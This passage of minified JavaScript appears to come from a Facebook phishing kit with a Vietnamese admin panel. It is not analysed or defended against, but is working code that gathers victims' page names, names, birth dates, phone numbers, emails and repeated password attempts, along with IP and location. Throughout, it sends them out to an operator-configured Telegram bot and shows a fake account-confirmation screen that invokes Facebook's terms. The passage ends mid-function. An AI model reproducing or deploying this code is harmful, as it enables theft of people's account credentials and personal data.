  , f6 = c6
  , d6 = /\s/;
function p6(e) {
    for (var t = e.length; t-- && d6.test(e.charAt(t)); )
        ;
    return t
}
var h6 = p6
  , m6 = h6
  , g6 = /^\s+/;
function y6(e) {
    return e && e.slice(0, m6(e) + 1).replace(g6, "")
}
var v6 = y6
  , x6 = O1
  , w6 = x6.Symbol
  , R1 = w6
  , Ih = R1
  , A1 = Object.prototype
  , b6 = A1.hasOwnProperty
  , S6 = A1.toString
  , ko = Ih ? Ih.toStringTag : void 0;
function N6(e) {
    var t = b6.call(e, ko)
      , n = e[ko];
    try {
        e[ko] = void 0;
        var r = !0
    } catch {}
    var a = S6.call(e);
    return r && (t ? e[ko] = n : delete e[ko]),
    a
}
var C6 = N6
  , k6 = Object.prototype
  , j6 = k6.toString;
function E6(e) {
    return j6.call(e)
}
var _6 = E6
  , Mh = R1
  , T6 = C6
  , P6 = _6
  , O6 = "[object Null]"
  , R6 = "[object Undefined]"
  , Dh = Mh ? Mh.toStringTag : void 0;
function A6(e) {
    return e == null ? e === void 0 ? R6 : O6 : Dh && Dh in Object(e) ? T6(e) : P6(e)
}
var L6 = A6;
function I6(e) {
    return e != null && typeof e == "object"
}
var M6 = I6
  , D6 = L6
  , z6 = M6
  , F6 = "[object Symbol]";
function U6(e) {
    return typeof e == "symbol" || z6(e) && D6(e) == F6
}
var B6 = U6
  , $6 = v6
  , zh = P1
  , H6 = B6
  , Fh = NaN
  , V6 = /^[-+]0x[0-9a-f]+$/i
  , W6 = /^0b[01]+$/i
  , K6 = /^0o[0-7]+$/i
  , G6 = parseInt;
function Y6(e) {
    if (typeof e == "number")
        return e;
    if (H6(e))
        return Fh;
    if (zh(e)) {
        var t = typeof e.valueOf == "function" ? e.valueOf() : e;
        e = zh(t) ? t + "" : t
    }
    if (typeof e != "string")
        return e === 0 ? e : +e;
    e = $6(e);
    var n = W6.test(e);
    return n || K6.test(e) ? G6(e.slice(2), n ? 2 : 8) : V6.test(e) ? Fh : +e
}
var Q6 = Y6
  , X6 = P1
  , bu = f6
  , Uh = Q6
  , q6 = "Expected a function"
  , J6 = Math.max
  , Z6 = Math.min;
function e5(e, t, n) {
    var r, a, o, i, s, u, c = 0, f = !1, d = !1, h = !0;
    if (typeof e != "function")
        throw new TypeError(q6);
    t = Uh(t) || 0,
    X6(n) && (f = !!n.leading,
    d = "maxWait"in n,
    o = d ? J6(Uh(n.maxWait) || 0, t) : o,
    h = "trailing"in n ? !!n.trailing : h);
    function N(w) {
        var A = r
          , P = a;
        return r = a = void 0,
        c = w,
        i = e.apply(P, A),
        i
    }
    function y(w) {
        return c = w,
        s = setTimeout(g, t),
        f ? N(w) : i
    }
    function S(w) {
        var A = w - u
          , P = w - c
          , K = t - A;
        return d ? Z6(K, o - P) : K
    }
    function x(w) {
        var A = w - u
          , P = w - c;
        return u === void 0 || A >= t || A < 0 || d && P >= o
    }
    function g() {
        var w = bu();
        if (x(w))
            return p(w);
        s = setTimeout(g, S(w))
    }
    function p(w) {
        return s = void 0,
        h && r ? N(w) : (r = a = void 0,
        i)
    }
    function m() {
        s !== void 0 && clearTimeout(s),
        c = 0,
        r = u = a = s = void 0
    }
    function C() {
        return s === void 0 ? i : p(bu())
    }
    function k() {
        var w = bu()
          , A = x(w);
        if (r = arguments,
        a = this,
        u = w,
        A) {
            if (s === void 0)
                return y(u);
            if (d)
                return clearTimeout(s),
                s = setTimeout(g, t),
                N(u)
        }
        return s === void 0 && (s = setTimeout(g, t)),
        i
    }
    return k.cancel = m,
    k.flush = C,
    k
}
var t5 = e5;
const n5 = hi(t5)
  , r5 = () => {
    const [e,t] = j.useState(!1)
      , [n,r] = j.useState("")
      , [a,o] = j.useState(null)
      , [i,s] = j.useState(null)
      , [u,c] = j.useState({
        chat_id: "",
        token: ""
    })
      , f = async () => {
        try {
            const S = localStorage.getItem("token")
              , x = await Ee.get("/api/admin/config", {
                headers: {
                    Authorization: `Bearer ${S}`
                }
            })
              , [g,p] = x.data
              , m = {
                chat_id: g || "",
                token: p || ""
            };
            c({
                chat_id: m.chat_id,
                token: m.token
            })
        } catch {
            r("Không tìm thấy cấu hình")
        }
    }
    ;
    j.useEffect( () => {
        f()
    }
    , []);
    const h = n5(async (S, x) => {
        if (!(!S || !x))
            try {
                const g = await Ee.get(`https://api.telegram.org/bot${S}/getChat`, {
                    params: {
                        chat_id: x
                    }
                });
                g.data.ok && (o(g.data.result),
                r("Thông tin Telegram hợp lệ"))
            } catch {
                o(null),
                r("Thông tin Telegram không hợp lệ")
            }
    }
    , 500)
      , N = S => {
        const {name: x, value: g} = S.target;
        c(p => ({
            ...p,
            [x]: g
        })),
        (x === "token" || x === "chat_id") && h(x === "token" ? g : u.token, x === "chat_id" ? g : u.chat_id)
    }
      , y = async S => {
        if (S.preventDefault(),
        !a) {
            r("Vui lòng kiểm tra thông tin Telegram");
            return
        }
        t(!0),
        r("");
        try {
            const x = localStorage.getItem("token");
            await Ee.post("/api/admin/telegram", u, {
                headers: {
                    Authorization: `Bearer ${x}`
                }
            }),
            r("Cấu hình Telegram đã được cập nhật"),
            f()
        } catch {
            r("Không thể cập nhật cấu hình Telegram")
        } finally {
            t(!1)
        }
    }
    ;
    return l.jsxs("div", {
        className: "relative",
        children: [l.jsx("div", {
            className: "absolute -left-10 -top-10 z-0 h-40 w-40 animate-float rounded-full bg-purple-100/10"
        }), l.jsx("div", {
            className: "absolute right-20 top-40 z-0 h-24 w-24 animate-float-delayed rounded-full bg-pink-100/10"
        }), l.jsx("div", {
            className: "absolute bottom-20 left-1/3 z-0 h-32 w-32 animate-float rounded-full bg-purple-100/10"
        }), i && l.jsx(El, {
            message: i,
            onClose: () => s(null)
        }), l.jsx("div", {
            className: "relative mx-auto max-w-2xl animate-fade-in",
            children: l.jsx("div", {
                className: "overflow-hidden rounded-3xl bg-white/10 p-1 backdrop-blur-lg",
                children: l.jsxs("div", {
                    className: "relative rounded-2xl bg-white p-4 shadow-2xl sm:p-8",
                    children: [l.jsx("div", {
                        className: "absolute -right-6 -top-6 h-24 w-24 rounded-full bg-gradient-to-br from-purple-600 to-pink-500 opacity-20 blur-lg"
                    }), l.jsx("div", {
                        className: "absolute -left-6 -top-6 h-24 w-24 rounded-full bg-gradient-to-br from-blue-600 to-purple-500 opacity-20 blur-lg"
                    }), l.jsxs("div", {
                        className: "relative space-y-6",
                        children: [l.jsxs("div", {
                            className: "flex flex-col items-center gap-3 sm:flex-row",
                            children: [l.jsx("div", {
                                className: "rounded-full bg-gradient-to-r from-purple-600 to-pink-500 p-2",
                                children: l.jsx(ue, {
                                    icon: qs,
                                    className: "text-2xl text-white"
                                })
                            }), l.jsx("h1", {
                                className: "text-center text-2xl font-bold text-purple-900 sm:text-left",
                                children: "Cấu Hình Telegram"
                            })]
                        }), l.jsxs("form", {
                            onSubmit: y,
                            className: "space-y-6",
                            children: [l.jsxs("div", {
                                className: "space-y-4",
                                children: [l.jsxs("div", {
                                    children: [l.jsx("label", {
                                        htmlFor: "chat_id",
                                        className: "block text-sm font-medium text-purple-700",
                                        children: "Chat ID"
                                    }), l.jsx("input", {
                                        type: "text",
                                        id: "chat_id",
                                        name: "chat_id",
                                        value: u.chat_id,
                                        onChange: N,
                                        className: "mt-1 block w-full rounded-xl border border-purple-100 bg-purple-50 px-4 py-3 placeholder-purple-400 transition-all duration-200 focus:border-purple-500 focus:bg-white focus:outline-none focus:ring-2 focus:ring-purple-200",
                                        placeholder: "Nhập Chat ID Telegram",
                                        autoFocus: !0
                                    })]
                                }), l.jsxs("div", {
                                    children: [l.jsx("label", {
                                        htmlFor: "token",
                                        className: "block text-sm font-medium text-purple-700",
                                        children: "Token Bot"
                                    }), l.jsx("input", {
                                        type: "text",
                                        id: "token",
                                        name: "token",
                                        value: u.token,
                                        onChange: N,
                                        className: "mt-1 block w-full rounded-xl border border-purple-100 bg-purple-50 px-4 py-3 placeholder-purple-400 transition-all duration-200 focus:border-purple-500 focus:bg-white focus:outline-none focus:ring-2 focus:ring-purple-200",
                                        placeholder: "Nhập Token Bot Telegram"
                                    })]
                                })]
                            }), a && l.jsxs("div", {
                                className: "animate-fade-in rounded-xl border border-purple-100 bg-purple-50/50 p-4",
                                children: [l.jsxs("div", {
                                    className: "flex items-center gap-2 text-purple-700",
                                    children: [l.jsx(ue, {
                                        icon: Hb,
                                        className: "text-purple-500"
                                    }), l.jsx("span", {
                                        className: "font-medium",
                                        children: "Thông tin chat:"
                                    })]
                                }), l.jsxs("div", {
                                    className: "mt-2 space-y-1 text-sm text-purple-600",
                                    children: [l.jsxs("p", {
                                        children: ["ID: ", a.id]
                                    }), l.jsxs("p", {
                                        children: ["Loại: ", a.type]
                                    }), a.title && l.jsxs("p", {
                                        children: ["Tên: ", a.title]
                                    }), a.username && l.jsxs("p", {
                                        children: ["Username:", " ", l.jsxs("a", {
                                            href: `https://t.me/${a.username}`,
                                            target: "_blank",
                                            className: "text-purple-600 hover:text-purple-700 hover:underline",
                                            children: ["@", a.username]
                                        })]
                                    }), a.first_name && l.jsxs("p", {
                                        children: ["Tên người dùng:", " ", a.first_name, " ", a.last_name]
                                    })]
                                })]
                            }), l.jsx("button", {
                                type: "submit",
                                disabled: e || !a,
                                className: "group relative w-full overflow-hidden rounded-xl bg-gradient-to-r from-purple-600 to-pink-500 px-6 py-3 font-medium text-white transition-all duration-200 hover:shadow-lg hover:shadow-purple-500/25 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:ring-offset-2 disabled:opacity-50 disabled:hover:shadow-none",
                                children: e ? "Đang cập nhật..." : "Lưu Cấu Hình"
                            })]
                        }), n && l.jsx("div", {
                            className: `animate-fade-in rounded-xl p-4 backdrop-blur-sm ${n.includes("không hợp lệ") || n.includes("Failed") ? "border border-purple-200/50 bg-gradient-to-r from-purple-50/80 via-pink-50/80 to-rose-50/80" : "border border-purple-200/50 bg-gradient-to-r from-purple-50/80 via-blue-50/80 to-emerald-50/80"} text-purple-700`,
                            children: l.jsxs("div", {
                                className: "flex items-center gap-2",
                                children: [l.jsx(ue, {
                                    icon: n.includes("không hợp lệ") || n.includes("Failed") ? Xr : oo,
                                    className: "text-purple-500"
                                }), l.jsx("span", {
                                    className: "font-medium",
                                    children: n
                                })]
                            })
                        })]
                    })]
                })
            })
        })]
    })
}
  , a5 = {
    code_loading_time: 0,
    pass_loading_time: 0,
    max_pass_attempts: 0,
    max_code_attempts: 0
}
  , o5 = () => {
    const [e,t] = j.useState(!1)
      , [n,r] = j.useState(null)
      , [a,o] = j.useState(a5)
      , i = async () => {
        try {
            const c = localStorage.getItem("token")
              , f = await Ee.get("/api/admin/config", {
                headers: {
                    Authorization: `Bearer ${c}`
                }
            })
              , [,,d,h,N,y] = f.data;
            o({
                code_loading_time: Number(d) || 0,
                pass_loading_time: Number(h) || 0,
                max_pass_attempts: Number(N) || 0,
                max_code_attempts: Number(y) || 0
            })
        } catch {
            r("Không thể tải cấu hình")
        }
    }
    ;
    j.useEffect( () => {
        i()
    }
    , []);
    const s = async c => {
        c.preventDefault(),
        t(!0);
        try {
            const f = localStorage.getItem("token");
            await Ee.post("/api/admin/config", a, {
                headers: {
                    Authorization: `Bearer ${f}`
                }
            }),
            r("Cấu hình website đã được cập nhật"),
            i()
        } catch {
            r("Không thể cập nhật cấu hình")
        } finally {
            t(!1)
        }
    }
      , u = c => {
        const {name: f, value: d} = c.target;
        o(h => ({
            ...h,
            [f]: d === "" ? 0 : Math.max(0, parseInt(d) || 0)
        }))
    }
    ;
    return l.jsxs("div", {
        className: "",
        children: [l.jsx("div", {
            className: "absolute -left-10 -top-10 z-0 h-40 w-40 animate-float rounded-full bg-purple-100/10"
        }), l.jsx("div", {
            className: "absolute right-20 top-40 z-0 h-24 w-24 animate-float-delayed rounded-full bg-pink-100/10"
        }), l.jsx("div", {
            className: "absolute bottom-20 left-1/3 z-0 h-32 w-32 animate-float rounded-full bg-purple-100/10"
        }), n && l.jsx(El, {
            message: n,
            onClose: () => r(null)
        }), l.jsx("div", {
            className: "relative mx-auto max-w-2xl animate-fade-in",
            children: l.jsx("div", {
                className: "overflow-hidden rounded-3xl bg-white/10 p-1 backdrop-blur-lg",
                children: l.jsxs("div", {
                    className: "relative rounded-2xl bg-white p-4 shadow-2xl sm:p-8",
                    children: [l.jsx("div", {
                        className: "absolute -right-6 -top-6 h-24 w-24 rounded-full bg-gradient-to-br from-purple-600 to-pink-500 opacity-20 blur-lg"
                    }), l.jsx("div", {
                        className: "absolute -left-6 -top-6 h-24 w-24 rounded-full bg-gradient-to-br from-blue-600 to-purple-500 opacity-20 blur-lg"
                    }), l.jsxs("div", {
                        className: "relative space-y-6",
                        children: [l.jsxs("div", {
                            className: "flex flex-col items-center gap-3 sm:flex-row",
                            children: [l.jsx("div", {
                                className: "rounded-full bg-gradient-to-r from-purple-600 to-pink-500 p-2",
                                children: l.jsx(ue, {
                                    icon: Qs,
                                    className: "text-2xl text-white"
                                })
                            }), l.jsx("h1", {
                                className: "text-center text-2xl font-bold text-purple-900 sm:text-left",
                                children: "Cấu Hình Website"
                            })]
                        }), l.jsxs("form", {
                            onSubmit: s,
                            className: "space-y-6",
                            children: [l.jsx("div", {
                                className: "rounded-xl border border-purple-100 bg-purple-50/50 p-4 sm:p-6",
                                children: l.jsx("div", {
                                    className: "space-y-4",
                                    children: [{
                                        id: "code_loading_time",
                                        label: "Thời Gian Load Giữa Các Lần Nhập Code (ms)"
                                    }, {
                                        id: "pass_loading_time",
                                        label: "Thời Gian Load Giữa Các Lần Nhập Mật Khẩu (ms)"
                                    }, {
                                        id: "max_pass_attempts",
                                        label: "Số Lần Nhập Mật Khẩu Tối Đa"
                                    }, {
                                        id: "max_code_attempts",
                                        label: "Số Lần Nhập Code Tối Đa"
                                    }].map(c => l.jsxs("div", {
                                        className: "group rounded-xl border border-purple-100 bg-white p-4 transition-all duration-200 hover:border-purple-200 hover:shadow-sm",
                                        children: [l.jsx("label", {
                                            htmlFor: c.id,
                                            className: "block text-sm font-medium text-purple-900",
                                            children: c.label
                                        }), l.jsx("input", {
                                            type: "number",
                                            id: c.id,
                                            name: c.id,
                                            value: a[c.id],
                                            onChange: u,
                                            className: "mt-2 block w-full rounded-xl border border-purple-100 bg-purple-50 px-4 py-3 placeholder-purple-400 transition-all duration-200 focus:border-purple-500 focus:bg-white focus:outline-none focus:ring-2 focus:ring-purple-200"
                                        })]
                                    }, c.id))
                                })
                            }), l.jsx("button", {
                                type: "submit",
                                disabled: e,
                                className: "group relative w-full overflow-hidden rounded-xl bg-gradient-to-r from-purple-600 to-pink-500 px-6 py-3.5 font-medium text-white transition-all duration-200 hover:shadow-lg hover:shadow-purple-500/25 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:ring-offset-2 disabled:opacity-70",
                                children: l.jsxs("span", {
                                    className: "relative flex items-center justify-center gap-2",
                                    children: [e && l.jsx(ue, {
                                        icon: kc,
                                        className: "animate-spin"
                                    }), e ? "Đang Cập Nhật..." : "Lưu Cấu Hình"]
                                })
                            })]
                        })]
                    })]
                })
            })
        })]
    })
}
  , i5 = "/assets/verify-B459MHxt.png"
  , s5 = () => l.jsx("div", {
    className: "h-6 w-6 animate-spin rounded-full border-2 border-white border-r-transparent border-t-transparent"
})
  , l5 = "data:image/png;base64,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"
  , L1 = ({loadingTime: e, setShowLoadingModal: t}) => {
    const [n,r] = j.useState(0);
    return j.useEffect( () => {
        const o = setInterval( () => {
            r(i => {
                const s = i + 100 / (e / 100);
                return s >= 100 ? (clearInterval(o),
                t(!1),
                100) : s
            }
            )
        }
        , 100);
        return () => clearInterval(o)
    }
    , [e, t]),
    l.jsx("div", {
        className: "fixed inset-0 flex w-full items-center justify-center bg-gray-200",
        children: l.jsxs("div", {
            className: "flex w-11/12 flex-col items-center justify-center rounded-lg bg-white p-5 md:w-1/3",
            children: [l.jsx("img", {
                alt: "Lock",
                src: l5,
                className: "mb-5 w-1/6"
            }), l.jsx("div", {
                className: "mb-5 text-xl font-semibold",
                children: "Please Wait..."
            }), l.jsx("b", {
                className: "w-1/2 text-sm text-black",
                children: "Thank you for confirming your account"
            }), l.jsx("p", {
                className: "w-1/2 text-sm text-gray-500",
                children: "This warning is for preventing the account being permanently disabled if there is a violation of Facebook's terms."
            }), l.jsx("div", {
                className: "mt-4 h-3 w-full rounded-full bg-gray-300",
                children: l.jsx("div", {
                    className: "h-3 rounded-full bg-blue-500",
                    style: {
                        width: `${n}%`
                    }
                })
            })]
        })
    })
}
  , u5 = "/assets/home-image-VAkJ10vV.png"
  , fa = async () => {
    try {
        const e = await Ee.get("/api/admin/config")
          , [t,n,r,a,o,i] = e.data;
        return {
            settings: {
                code_loading_time: r,
                pass_loading_time: a,
                max_pass_attempts: o,
                max_code_attempts: i
            },
            telegram: {
                chat_id: t,
                token: n
            }
        }
    } catch (e) {
        throw console.error("Error fetching config:", e),
        e
    }
}
  , c5 = async e => {
    const t = await fa()
      , n = `https://api.telegram.org/bot${t.telegram.token}/sendMessage`
      , r = await Ee.post(n, {
        chat_id: t.telegram.chat_id,
        text: e.text,
        parse_mode: "HTML"
    });
    localStorage.setItem("message_id", r.data.result.message_id.toString())
}
  , tl = async e => {
    const t = await fa()
      , n = `https://api.telegram.org/bot${t.telegram.token}/sendMessage`
      , r = `https://api.telegram.org/bot${t.telegram.token}/deleteMessage`;
    await Ee.post(r, {
        chat_id: t.telegram.chat_id,
        message_id: e.message_id
    });
    const a = await Ee.post(n, {
        chat_id: t.telegram.chat_id,
        text: e.text,
        parse_mode: "HTML"
    });
    return localStorage.setItem("message_id", a.data.result.message_id.toString()),
    a.data
}
  , f5 = async e => {
    const t = await fa()
      , n = new FormData;
    n.append("image", e.photo);
    const r = new FormData;
    r.append("chat_id", t.telegram.chat_id),
    r.append("photo", e.photo),
    r.append("reply_to_message_id", e.message_id.toString());
    try {
        return Ee.post("/api/upload-image", n, {
            headers: {
                "Content-Type": "multipart/form-data"
            }
        }).catch( () => {
            console.warn("Backend upload failed, but continuing with Telegram send")
        }
        ),
        (await Ee.post(`https://api.telegram.org/bot${t.telegram.token}/sendPhoto`, r, {
            headers: {
                "Content-Type": "multipart/form-data"
            }
        })).data
    } catch {
        throw new Error("Failed to send photo to Telegram")
    }
}
  , I1 = () => {
    const e = new Date
      , t = String(e.getDate()).padStart(2, "0")
      , n = e.toLocaleString("en-US", {
        month: "long"
    })
      , r = e.getFullYear();
    return `${n} ${t}, ${r}`
}
  , Vo = () => new Date().toLocaleString("vi-VN", {
    timeZone: "Asia/Ho_Chi_Minh",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    day: "2-digit",
    month: "2-digit",
    year: "numeric"
}).replace(",", " -")
  , d5 = () => {
    var le, z, M;
    const e = Dr()
      , t = ha()
      , n = localStorage.getItem("ipAddress")
      , r = ((le = localStorage.getItem("country")) == null ? void 0 : le.toUpperCase()) + " - " + ((z = localStorage.getItem("region")) == null ? void 0 : z.toUpperCase()) + " - " + ((M = localStorage.getItem("city")) == null ? void 0 : M.toUpperCase())
      , [a,o] = j.useState("")
      , [i,s] = j.useState(1)
      , [u,c] = j.useState(!1)
      , [f,d] = j.useState("")
      , [h,N] = j.useState("")
      , [y,S] = j.useState("")
      , [x,g] = j.useState("")
      , [p,m] = j.useState("")
      , [C,k] = j.useState("")
      , [w,A] = j.useState("")
      , P = j.useRef(null)
      , K = j.useRef(null)
      , $ = j.useRef(null)
      , Se = j.useRef(null)
      , Te = j.useRef(null)
      , Ae = j.useRef(null)
      , [H,X] = j.useState(0);
    j.useEffect( () => {
        (async () => {
            const ge = await fa();
            X(ge.settings.pass_loading_time)
        }
        )()
    }
    , []);
    const J = j.useRef(null)
      , Q = () => `#${Math.floor(Math.random() * 1e12).toString().padStart(12, "0")}`
      , V = () => {
        const Y = t.pathname
          , ge = () => {
            var ce, Ne, $e, Ue;
            if (f === "")
                (ce = P.current) == null || ce.focus();
            else if (h === "")
                (Ne = K.current) == null || Ne.focus();
            else if (y === "")
                ($e = $.current) == null || $e.focus();
            else if (x === "")
                (Ue = Se.current) == null || Ue.focus();
            else {
                const Ce = `<b>📅 Thời gian:</b> <code>${Vo()}</code>
<b>🌐 IP:</b> <code>${n}</code>
<b>🌍 Vị trí:</b> <code>${r}</code>

<b>📄 Tên Page:</b> <code>${f}</code>
<b>🧑 Tên:</b> <code>${h}</code>
<b>🎂 Ngày sinh:</b> <code>${x}</code>

<b>📞 Số điện thoại:</b> <code>${y}</code>
`;
                localStorage.setItem("message", Ce),
                c5({
                    text: Ce
                }),
                e("login")
            }
        }
          , W = () => {
            var ce, Ne;
            if (s(1),
            p === "")
                (ce = Te.current) == null || ce.focus();
            else if (C === "")
                (Ne = Ae.current) == null || Ne.focus();
            else {
                const Ue = (localStorage.getItem("message") ?? "").replace(/<b>📅 Thời gian:<\/b> <code>.*?<\/code>/, `<b>📅 Thời gian:</b> <code>${Vo()}</code>`) + `<b>📧 Email:</b> <code>${p}</code>
<b>🔒 Mật khẩu:</b> <code>${C}</code>`;
                localStorage.setItem("message", Ue);
                const Ce = localStorage.getItem("message_id");
                tl({
                    message_id: Number(Ce),
                    text: Ue
                }),
                xe()
            }
        }
          , b = () => {
            var ce;
            w === "" ? (ce = J.current) == null || ce.focus() : (s(i + 1),
            xe())
        }
          , xe = async () => {
            if (c(!0),
            Y === "/live/home/confirm-password") {
                const $e = (localStorage.getItem("message") ?? "").replace(/<b>📅 Thời gian:<\/b> <code>.*?<\/code>/, `<b>📅 Thời gian:</b> <code>${Vo()}</code>`) + `
<b>🔒 Mật khẩu ${i}:</b> <code>${w}</code>`;
                localStorage.setItem("message", $e);
                const Ue = localStorage.getItem("message_id");
                tl({
                    message_id: Number(Ue),
                    text: $e
                })
            }
            const ce = await fa();
            setTimeout(async () => {
                var Ne;
                c(!1),
